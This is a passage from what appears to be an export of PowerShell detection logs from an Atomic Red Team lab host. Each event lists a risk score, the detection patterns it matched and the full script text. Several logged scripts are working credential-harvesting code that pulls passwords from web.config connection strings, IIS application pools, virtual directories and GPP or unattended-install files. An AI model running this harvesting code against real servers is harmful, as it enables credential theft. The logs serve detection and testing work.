}\n        $htvars += [Hashtable]$PSBoundParameters\n        $htvars.Remove('listOfAtomics') | Out-Null\n        $htvars.Remove('OtherArgs') | Out-Null\n        $htvars.Remove('PauseBetweenAtomics') | Out-Null\n        $htvars.Remove('scheduledTaskCleanup') | Out-Null\n\n        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)\n\n        # If the schedule is empty, end process\n        if (-not $schedule) {\n            LogRunnerMsg \"No test guid's or enabled tests.\"\n            return\n        }\n\n        # timing variables\n        $SleepTillCleanup = Get-TimingVariable $schedule\n\n        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit\n        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {\n            $schedule | ForEach-Object {\n                Invoke-AtomicTestFromScheduleRow $_\n            }\n            return\n        }\n\n        # exit if file stop.txt is found\n        If (Test-Path $artConfig.stopFile) {\n            LogRunnerMsg \"exiting script because $($artConfig.stopFile) does exist\"\n            Write-Host -ForegroundColor Yellow \"Exiting script because $($artConfig.stopFile) does exist.\"; Start-Sleep 10;\n            exit\n        }\n\n        # Find current test to run\n        $guid = Get-GuidFromHostName $artConfig.basehostname\n        if ([string]::IsNullOrWhiteSpace($guid)) {\n            LogRunnerMsg \"Test Guid ($guid) was null, using next item in the schedule\"\n        }\n        else {\n            if ($artConfig.verbose) { LogRunnerMsg \"Found Test: $guid specified in hostname\" }\n            $sp = [Collections.Generic.List[Object]]$schedule\n            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })\n            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {\n                $tr = $schedule[$currentIndex]\n            }\n\n            if ($null -ne $tr) {\n                if ($scheduledTaskCleanup) {\n                    # Cleanup after running test\n                    Write-Host -Fore cyan \"Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) \"; Start-Sleep -Seconds $SleepTillCleanup\n                    $htvars.Add(\"Cleanup\", $true)\n                    Invoke-AtomicTestFromScheduleRow $tr\n                }\n                else {\n                    # run the atomic test and exit\n                    Invoke-AtomicTestFromScheduleRow $tr\n                    Start-Sleep 3; exit\n                }\n            }\n            else {\n                LogRunnerMsg \"Could not find Test: $guid in schedule. Please update schedule to run this test.\"\n            }\n        }\n\n        # Load next scheduled test before renaming computer\n        $nextIndex += $currentIndex + 1\n        if ($nextIndex -ge ($schedule.count)) {\n            $tr = $schedule[0]\n        }\n        else {\n            $tr = $schedule[$nextIndex]\n        }\n\n        if ($null -eq $tr) {\n            LogRunnerMsg \"Could not determine the next row to execute from the schedule, Starting from 1st row\";\n            $tr = $schedule[0]\n        }\n\n        #Rename Computer and Restart\n        Rename-ThisComputer $tr $artConfig.basehostname\n\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'"
    },
    {
      "timestamp": "2024-12-16T20:34:45.6827893+00:00",
      "event_id": 35709071,
      "risk_score": 3,
      "detected_patterns": ", IEX, Get",
      "pattern_details": "IEX [Score: 2]; Get [Score: 1]",
      "command_length": 4023,
      "full_command": "{\n\n                # Set web.config path\n                $CurrentPath = $_.fullname\n\n                # Read the data from the web.config xml file\n                [xml]$ConfigFile = Get-Content $_.fullname\n\n                # Check if the connectionStrings are encrypted\n                if ($ConfigFile.configuration.connectionStrings.add) {\n\n                    # Foreach connection string add to data table\n                    $ConfigFile.configuration.connectionStrings.add|\n                    ForEach-Object {\n\n                        [String]$MyConString = $_.connectionString\n                        if ($MyConString -like '*password*') {\n                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]\n                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]\n                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]\n                            $ConfVdir = $CurrentVdir\n                            $ConfEnc = 'No'\n                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)\n                        }\n                    }\n                }\n                else {\n\n                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)\n                    $AspnetRegiisPath = Get-ChildItem -Path \"$Env:SystemRoot\\Microsoft.NET\\Framework\\\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1\n\n                    # Check if aspnet_regiis.exe exists\n                    if (Test-Path  ($AspnetRegiisPath.FullName)) {\n\n                        # Setup path for temp web.config to the current user's temp dir\n                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\\web.config'\n\n                        # Remove existing temp web.config\n                        if (Test-Path  ($WebConfigPath)) {\n                            Remove-Item $WebConfigPath\n                        }\n\n                        # Copy web.config from vdir to user temp for decryption\n                        Copy-Item $CurrentPath $WebConfigPath\n\n                        # Decrypt web.config in user temp\n                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf \"connectionStrings\" (get-item $Env:temp).FullName'\n                        $Null = Invoke-Expression $AspnetRegiisCmd\n\n                        # Read the data from the web.config in temp\n                        [xml]$TMPConfigFile = Get-Content $WebConfigPath\n\n                        # Check if the connectionStrings are still encrypted\n                        if ($TMPConfigFile.configuration.connectionStrings.add) {\n\n                            # Foreach connection string add to data table\n                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {\n\n                                [String]$MyConString = $_.connectionString\n                                if ($MyConString -like '*password*') {\n                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]\n                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]\n                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]\n                                    $ConfVdir = $CurrentVdir\n                                    $ConfEnc = 'Yes'\n                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)\n                                }\n                            }\n                        }\n                        else {\n                            Write-Verbose \"Decryption of $CurrentPath failed.\"\n                            $False\n                        }\n                    }\n                    else {\n                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'\n                        $False\n                    }\n                }\n            }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:45.676181+00:00",
      "event_id": 35709064,
      "risk_score": 3,
      "detected_patterns": ", IEX, Get",
      "pattern_details": "IEX [Score: 2]; Get [Score: 1]",
      "command_length": 4562,
      "full_command": "{\n\n            $CurrentVdir = $_\n\n            # Converts CMD style env vars (%) to powershell env vars (env)\n            if ($_ -like \"*%*\") {\n                $EnvarName = \"`$Env:\"+$_.split(\"%\")[1]\n                $EnvarValue = Invoke-Expression $EnvarName\n                $RestofPath = $_.split('%')[2]\n                $CurrentVdir  = $EnvarValue+$RestofPath\n            }\n\n            # Search for web.config files in each virtual directory\n            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {\n\n                # Set web.config path\n                $CurrentPath = $_.fullname\n\n                # Read the data from the web.config xml file\n                [xml]$ConfigFile = Get-Content $_.fullname\n\n                # Check if the connectionStrings are encrypted\n                if ($ConfigFile.configuration.connectionStrings.add) {\n\n                    # Foreach connection string add to data table\n                    $ConfigFile.configuration.connectionStrings.add|\n                    ForEach-Object {\n\n                        [String]$MyConString = $_.connectionString\n                        if ($MyConString -like '*password*') {\n                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]\n                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]\n                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]\n                            $ConfVdir = $CurrentVdir\n                            $ConfEnc = 'No'\n                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)\n                        }\n                    }\n                }\n                else {\n\n                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)\n                    $AspnetRegiisPath = Get-ChildItem -Path \"$Env:SystemRoot\\Microsoft.NET\\Framework\\\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1\n\n                    # Check if aspnet_regiis.exe exists\n                    if (Test-Path  ($AspnetRegiisPath.FullName)) {\n\n                        # Setup path for temp web.config to the current user's temp dir\n                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\\web.config'\n\n                        # Remove existing temp web.config\n                        if (Test-Path  ($WebConfigPath)) {\n                            Remove-Item $WebConfigPath\n                        }\n\n                        # Copy web.config from vdir to user temp for decryption\n                        Copy-Item $CurrentPath $WebConfigPath\n\n                        # Decrypt web.config in user temp\n                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf \"connectionStrings\" (get-item $Env:temp).FullName'\n                        $Null = Invoke-Expression $AspnetRegiisCmd\n\n                        # Read the data from the web.config in temp\n                        [xml]$TMPConfigFile = Get-Content $WebConfigPath\n\n                        # Check if the connectionStrings are still encrypted\n                        if ($TMPConfigFile.configuration.connectionStrings.add) {\n\n                            # Foreach connection string add to data table\n                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {\n\n                                [String]$MyConString = $_.connectionString\n                                if ($MyConString -like '*password*') {\n                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]\n                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]\n                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]\n                                    $ConfVdir = $CurrentVdir\n                                    $ConfEnc = 'Yes'\n                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)\n                                }\n                            }\n                        }\n                        else {\n                            Write-Verbose \"Decryption of $CurrentPath failed.\"\n                            $False\n                        }\n                    }\n                    else {\n                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'\n                        $False\n                    }\n                }\n            }\n        }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.8071207+00:00",
      "event_id": 35710637,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousKeyword, Reflection",
      "pattern_details": "SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 831,
      "full_command": "function Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:52.8817491+00:00",
      "event_id": 35709159,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousCmdlet, Get",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 45,
      "full_command": "{ Get-CachedGPPPassword | Where-Object {$_} }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Get-CachedGPPPassword'"
    },
    {
      "timestamp": "2024-12-16T20:34:46.7478937+00:00",
      "event_id": 35709147,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousCmdlet, Get",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 44,
      "full_command": "{ Get-SiteListPassword | Where-Object {$_} }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Get-SiteListPassword'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4259187+00:00",
      "event_id": 35710559,
      "risk_score": 2,
      "detected_patterns": ", Get, SuspiciousKeyword",
      "pattern_details": "Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 3188,
      "full_command": "function Invoke-KickoffAtomicRunner {\n\n    #log rotation function\n    function Rotate-Log {\n        Param ($logPath, $max_filesize, $max_age)\n        $datetime = Get-Date -uformat \"%Y-%m-%d-%H%M\"\n\n        $log = Get-Item $logPath\n        if ($log.Length / 1MB -ge $max_filesize) {\n            Write-Host \"file named $($log.name) is bigger than $max_filesize MB\"\n            $newname = \"$($log.Name)_${datetime}.arclog\"\n            Rename-Item $log.PSPath $newname\n            Write-Host \"Done rotating file\"\n        }\n\n        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter \"*.arclog\"\n        $cutoff_date = (get-date).AddDays($max_age)\n        $logdir_content | ForEach-Object {\n            if ($_.LastWriteTime -gt $cutoff_date) {\n                Remove-Item $_\n                Write-Host \"Removed $($_.PSPath)\"\n            }\n        }\n    }\n\n    #Create log files as needed\n    $all_log_file = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname).txt\"\n    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname)-cleanup.txt\"\n    New-Item $all_log_file -ItemType file -ErrorAction Ignore\n    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore\n    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore\n\n    #Rotate logs based on FileSize and Date max_filesize\n    $max_filesize = 200 #in MB\n    $max_file_age = 30 #in days\n    Rotate-Log $all_log_file $max_filesize $max_file_age\n    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age\n\n    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.\n\n    # Optional additional delay before starting\n    Start-Sleep $artConfig.kickOffDelay.TotalSeconds\n\n    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n    $FileName = if ($IsLinux -or $IsMacOS) { \"pwsh\" } else { \"powershell.exe\" }\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner *>> $all_log_file\" } else { $Arguments = \"-Command Invoke-AtomicRunner\" }\n    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic\n    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup\" } else { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup\" }\n    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    return $p1,$p2\n\n}\n\nfunction LogRunnerMsg ($message) {\n    $mutexName = 'AtomicRunnerLoggingMutex'\n    $mutex = New-Object 'Threading.Mutex' $false, $mutexName\n    # Grab the mutex. Will block until this process has it.\n    $mutex.WaitOne() | Out-Null\n    try {\n        # OK. Now it is safe to write to your log file\n        $now = \"[{0:MM/dd/yy} {0:HH:mm:ss}]\" -f (Get-Date)\n        Write-Host -fore cyan $message\n        Add-Content $artConfig.logFile \"$now`: $message\"\n    }\n    finally {\n        $mutex.ReleaseMutex()\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'Get' matched: 'get-'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:46.1645626+00:00",
      "event_id": 35709089,
      "risk_score": 2,
      "detected_patterns": ", IEX",
      "pattern_details": "IEX [Score: 2]",
      "command_length": 815,
      "full_command": "{\n\n            # Get application pool name\n            $PoolName = $_\n\n            # Get username\n            $PoolUserCmd = \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list apppool \" + \"`\"$PoolName`\" /text:processmodel.username\"\n            $PoolUser = Invoke-Expression $PoolUserCmd\n\n            # Get password\n            $PoolPasswordCmd = \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list apppool \" + \"`\"$PoolName`\" /text:processmodel.password\"\n            $PoolPassword = Invoke-Expression $PoolPasswordCmd\n\n            # Check if credentials exists\n            if (($PoolPassword -ne \"\") -and ($PoolPassword -isnot [system.array])) {\n                # Add credentials to database\n                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)\n            }\n        }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'"
    },
    {
      "timestamp": "2024-12-16T20:34:46.1139071+00:00",
      "event_id": 35709085,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousCmdlet, Get",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 43,
      "full_command": "{ Get-ApplicationHost | Where-Object {$_} }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Get-ApplicationHost'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2219207+00:00",
      "event_id": 35710698,
      "risk_score": 2,
      "detected_patterns": ", Get, SuspiciousKeyword",
      "pattern_details": "Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 3188,
      "full_command": "function Invoke-KickoffAtomicRunner {\n\n    #log rotation function\n    function Rotate-Log {\n        Param ($logPath, $max_filesize, $max_age)\n        $datetime = Get-Date -uformat \"%Y-%m-%d-%H%M\"\n\n        $log = Get-Item $logPath\n        if ($log.Length / 1MB -ge $max_filesize) {\n            Write-Host \"file named $($log.name) is bigger than $max_filesize MB\"\n            $newname = \"$($log.Name)_${datetime}.arclog\"\n            Rename-Item $log.PSPath $newname\n            Write-Host \"Done rotating file\"\n        }\n\n        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter \"*.arclog\"\n        $cutoff_date = (get-date).AddDays($max_age)\n        $logdir_content | ForEach-Object {\n            if ($_.LastWriteTime -gt $cutoff_date) {\n                Remove-Item $_\n                Write-Host \"Removed $($_.PSPath)\"\n            }\n        }\n    }\n\n    #Create log files as needed\n    $all_log_file = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname).txt\"\n    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname)-cleanup.txt\"\n    New-Item $all_log_file -ItemType file -ErrorAction Ignore\n    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore\n    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore\n\n    #Rotate logs based on FileSize and Date max_filesize\n    $max_filesize = 200 #in MB\n    $max_file_age = 30 #in days\n    Rotate-Log $all_log_file $max_filesize $max_file_age\n    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age\n\n    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.\n\n    # Optional additional delay before starting\n    Start-Sleep $artConfig.kickOffDelay.TotalSeconds\n\n    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n    $FileName = if ($IsLinux -or $IsMacOS) { \"pwsh\" } else { \"powershell.exe\" }\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner *>> $all_log_file\" } else { $Arguments = \"-Command Invoke-AtomicRunner\" }\n    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic\n    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup\" } else { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup\" }\n    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    return $p1,$p2\n\n}\n\nfunction LogRunnerMsg ($message) {\n    $mutexName = 'AtomicRunnerLoggingMutex'\n    $mutex = New-Object 'Threading.Mutex' $false, $mutexName\n    # Grab the mutex. Will block until this process has it.\n    $mutex.WaitOne() | Out-Null\n    try {\n        # OK. Now it is safe to write to your log file\n        $now = \"[{0:MM/dd/yy} {0:HH:mm:ss}]\" -f (Get-Date)\n        Write-Host -fore cyan $message\n        Add-Content $artConfig.logFile \"$now`: $message\"\n    }\n    finally {\n        $mutex.ReleaseMutex()\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'Get' matched: 'get-'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.6989131+00:00",
      "event_id": 35710828,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousKeyword, Reflection",
      "pattern_details": "SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 831,
      "full_command": "function Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.0134888+00:00",
      "event_id": 35710498,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousKeyword, Reflection",
      "pattern_details": "SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 831,
      "full_command": "function Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:46.5584265+00:00",
      "event_id": 35709125,
      "risk_score": 2,
      "detected_patterns": ", IEX",
      "pattern_details": "IEX [Score: 2]",
      "command_length": 785,
      "full_command": "{\n\n            # Get Virtual Directory Name\n            $VdirName = $_\n\n            # Get username\n            $VdirUserCmd = \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list vdir \" + \"`\"$VdirName`\" /text:userName\"\n            $VdirUser = Invoke-Expression $VdirUserCmd\n\n            # Get password\n            $VdirPasswordCmd = \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list vdir \" + \"`\"$VdirName`\" /text:password\"\n            $VdirPassword = Invoke-Expression $VdirPasswordCmd\n\n            # Check if credentials exists\n            if (($VdirPassword -ne \"\") -and ($VdirPassword -isnot [system.array])) {\n                # Add credentials to database\n                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')\n            }\n        }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'"
    },
    {
      "timestamp": "2024-12-16T20:34:45.573784+00:00",
      "event_id": 35709040,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousCmdlet, Get",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 29,
      "full_command": "{ Get-UnattendedInstallFile }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Get-UnattendedInstallFile'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.0992621+00:00",
      "event_id": 35710889,
      "risk_score": 2,
      "detected_patterns": ", Get, SuspiciousKeyword",
      "pattern_details": "Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 3188,
      "full_command": "function Invoke-KickoffAtomicRunner {\n\n    #log rotation function\n    function Rotate-Log {\n        Param ($logPath, $max_filesize, $max_age)\n        $datetime = Get-Date -uformat \"%Y-%m-%d-%H%M\"\n\n        $log = Get-Item $logPath\n        if ($log.Length / 1MB -ge $max_filesize) {\n            Write-Host \"file named $($log.name) is bigger than $max_filesize MB\"\n            $newname = \"$($log.Name)_${datetime}.arclog\"\n            Rename-Item $log.PSPath $newname\n            Write-Host \"Done rotating file\"\n        }\n\n        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter \"*.arclog\"\n        $cutoff_date = (get-date).AddDays($max_age)\n        $logdir_content | ForEach-Object {\n            if ($_.LastWriteTime -gt $cutoff_date) {\n                Remove-Item $_\n                Write-Host \"Removed $($_.PSPath)\"\n            }\n        }\n    }\n\n    #Create log files as needed\n    $all_log_file = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname).txt\"\n    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname)-cleanup.txt\"\n    New-Item $all_log_file -ItemType file -ErrorAction Ignore\n    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore\n    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore\n\n    #Rotate logs based on FileSize and Date max_filesize\n    $max_filesize = 200 #in MB\n    $max_file_age = 30 #in days\n    Rotate-Log $all_log_file $max_filesize $max_file_age\n    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age\n\n    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.\n\n    # Optional additional delay before starting\n    Start-Sleep $artConfig.kickOffDelay.TotalSeconds\n\n    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n    $FileName = if ($IsLinux -or $IsMacOS) { \"pwsh\" } else { 